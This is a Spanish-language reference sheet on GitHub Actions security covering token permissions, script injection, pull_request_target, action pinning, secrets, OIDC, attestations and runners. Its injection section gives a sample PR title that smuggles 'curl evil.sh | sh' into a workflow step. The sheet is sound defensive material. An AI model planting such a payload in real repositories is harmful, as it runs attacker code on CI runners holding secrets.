# Actions — Seguridad

Fuente principal: "Referencia de uso seguro", "Uso seguro de pull_request_target", "GITHUB_TOKEN", "OpenID Connect".

## 1. GITHUB_TOKEN y `permissions`

- Token de instalación de la GitHub App de Actions, válido mientras dura el job (máx. 24 h), limitado al repo. Rate limit 1000 req/h por repo.
- Default configurable en Settings → Actions → General → "Workflow permissions" (repo/org/empresa): **read** (recomendado; default en repos/orgs nuevos) o read/write. Ahí también: "Allow GitHub Actions to create and approve pull requests" (mantener desactivado salvo necesidad).
- Al declarar `permissions:`, todo lo no listado queda en `none`.

Permisos disponibles: `actions`, `attestations`, `checks`, `contents`, `deployments`, `discussions`, `id-token`, `issues`, `models`, `packages`, `pages`, `pull-requests`, `security-events`, `statuses` (valores `read|write|none`; `id-token` solo `write|none`). Atajos: `read-all`, `write-all`, `{}`.

| Tarea | Permiso |
|---|---|
| checkout | `contents: read` |
| push de commits/tags, crear release | `contents: write` |
| comentar/etiquetar PR | `pull-requests: write` (issues: `issues: write`) |
| subir SARIF a code scanning | `security-events: write` |
| push a GHCR | `packages: write` |
| OIDC a la nube | `id-token: write` |
| desplegar Pages | `pages: write` + `id-token: write` |
| atestaciones | `attestations: write` + `id-token: write` |
| crear check runs | `checks: write` |

Desde forks en `pull_request` el token es siempre de solo lectura (salvo la opción de org "Send write tokens to workflows from fork pull requests" en repos privados).

## 2. Inyección de scripts

`${{ }}` se expande **antes** de que el shell vea el script. Un título de PR como `a"; curl evil.sh | sh; echo "` se ejecuta.

Contextos potencialmente controlados por atacantes: `github.event.issue.title/body`, `github.event.pull_request.title/body`, `github.event.comment.body`, `github.event.review.body`, `github.event.pages.*.page_name`, `github.event.commits.*.message`, `github.event.head_commit.message/author.email/author.name`, `github.event.pull_request.head.ref/label`, `github.head_ref`, `github.event.workflow_run.head_branch`, cualquier `*.body`, `*.title`, `*.message`, `*.name`, `*.email`, `*.ref`, `*.label`.

```yaml
# MAL
- run: echo "El título es ${{ github.event.pull_request.title }}"
# BIEN
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "El título es $TITLE"
```
Lo mismo aplica a `actions/github-script` (`script:` es JavaScript: no interpolar; usa `context.payload` o `process.env`). Code scanning (CodeQL) analiza workflows de Actions en default setup y detecta esto.

## 3. `pull_request_target` y `workflow_run`

- Corren con el código de la **rama base**, con secretos y token de escritura, y comparten cache con la rama por defecto (cache poisoning).
- **Nunca** combinar con checkout del head del PR + ejecución (`npm install`, `make`, scripts de build): es la "pwn request".
- Si necesitas CI con secretos para forks: separa en `pull_request` (sin privilegios, sube artefacto) → `workflow_run` (privilegiado, descarga artefacto tratándolo como datos no confiables, nunca lo ejecuta), o exige una etiqueta aplicada por un maintainer + environment con revisores.
- Prefiere `workflow_run` para separación de privilegios; usa `pull_request_target` solo para etiquetar/comentar.

## 4. Acciones de terceros

- **Pin a SHA completo**: `uses: owner/action@3f9e...a1 # v2.4.1`. Es la única referencia inmutable. Verifica que el SHA pertenezca al repo original (no a un fork).
- Políticas de repo/org: "Allow actions" (todas / solo de GitHub / verificadas en Marketplace / lista explícita con comodines) y **"Require actions to be pinned to a full-length commit SHA"**.
- Releases inmutables: los publicadores pueden marcar releases/tags como inmutables.
- Dependabot `package-ecosystem: github-actions` mantiene SHAs y actualiza el comentario de versión en la misma línea. Dependabot alerts **no** alerta acciones fijadas por SHA (solo semver).
- Audita el código: secretos enviados a hosts externos, descargas de binarios sin checksum.
- Mismo criterio para reusable workflows de terceros.

## 5. Secretos

- Niveles: repo, environment, organización (con política de repos), Dependabot y Codespaces tienen almacenes separados.
- Quien tiene **write** en el repo puede leer todos sus secretos (ejecutando un workflow).
- Enmascarado automático solo de coincidencia exacta: no guardes JSON/YAML como un único secreto; registra derivados con `::add-mask::`.
- Si un secreto aparece en un log: borra los logs del run y **rota** el secreto.
- Para secretos de producción: environment con revisores requeridos.
- Mejor aún: OIDC para nubes y Vault, sin secretos de larga duración.

## 6. OIDC

```yaml
permissions:
  id-token: write
  contents: read
jobs:
  deploy:
    environment: production
    runs-on: ubuntu-latest
    steps:
      - uses: aws-actions/configure-aws-credentials@v4   # verifica versión
        with:
          role-to-assume: arn:aws:iam::123456789012:role/gha-deploy
          aws-region: us-east-1
```
- Emisor: `https://token.actions.githubusercontent.com`; audiencia por defecto de AWS: `sts.amazonaws.com`.
- Claim `sub` según evento: `repo:ORG/REPO:ref:refs/heads/main`, `repo:ORG/REPO:environment:production`, `repo:ORG/REPO:pull_request`. **Condiciona siempre el trust policy por `sub`** (y por `repository_id`/`repository_owner_id` si personalizas), nunca solo por `aud`.
- Otras claims útiles: `job_workflow_ref` (para restringir a un reusable workflow concreto), `environment`, `ref`, `actor`, `repository_visibility`.
- Plantilla de `sub` personalizable vía API por org/repo. Las claims personalizadas no se admiten en AWS.
- Guías oficiales: AWS, Azure (`azure/login` con federated credential), GCP (Workload Identity Federation), HashiCorp Vault, JFrog, Octopus, PyPI (trusted publishing).

## 7. Atestaciones y cadena de suministro

```yaml
permissions:
  id-token: write
  contents: read
  attestations: write
steps:
  - uses: actions/attest-build-provenance@v3   # verifica versión
    with:
      subject-path: dist/app.tar.gz
```
Verificar: `gh attestation verify dist/app.tar.gz -R org/repo` (o `oci://ghcr.io/org/img@sha256:...`). Repos públicos usan Sigstore público; privados (Enterprise Cloud) la instancia interna de GitHub. Alcanza SLSA Build L2; con reusable workflows aislados, L3. Puede aplicarse en Kubernetes con el admission controller.

## 8. Runners

- Hospedados: VM efímera y limpia por job (salvo `ubuntu-slim`, contenedor aislado por hipervisor). `/etc/hosts` bloquea pools de minería conocidos.
- Self-hosted: **no** son efímeros por defecto; un job puede persistir malware, leer secretos de otros jobs (`ps`), credenciales del host o metadatos de la nube (169.254.169.254). Evítalos en repos públicos; usa JIT/efímeros, grupos por nivel de confianza, sin credenciales de larga vida en la máquina.
- Para egress controlado en hospedados: larger runners con red privada o herramientas tipo harden-runner.

## 9. Gobernanza

- CODEOWNERS sobre `.github/workflows/` + ruleset que exija revisión de code owners.
- Rulesets: "Restrict file paths" puede impedir cambios en workflows salvo bypass.
- Audit log: eventos `org.update_actions_secret`, `workflows.*`, etc.; security log personal.
- Dependency graph reconoce workflows como manifiestos; dependency review action bloquea acciones vulnerables en PRs.
- OpenSSF Scorecards revisa token permissions, pinned dependencies y dangerous workflows.
